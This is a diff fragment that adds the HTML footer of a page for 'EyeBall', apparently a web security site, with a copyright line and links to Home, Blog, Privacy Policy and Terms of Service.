+    <footer class="bg-brand-dark-secondary border-t border-white/5 mt-16">
+      <div class="container mx-auto px-4 sm:px-6 lg:px-8 py-12 text-center">
+        <p class="text-brand-light-secondary">EyeBall 2026. Secure the Web. All rights reserved.</p>
+        <div class="mt-6 flex justify-center space-x-8 text-sm text-brand-light-secondary font-mono">
+          <a href="../" class="hover:text-white transition">Home</a>
+          <a href="../#blog" class="hover:text-white transition">Blog</a>
+          <a href="../#privacy" class="hover:text-white transition">Privacy Policy</a>
+          <a href="../#terms" class="hover:text-white transition">Terms of Service</a>
+        </div>
+      </div>
+    </footer>
+  </body>
+</html>
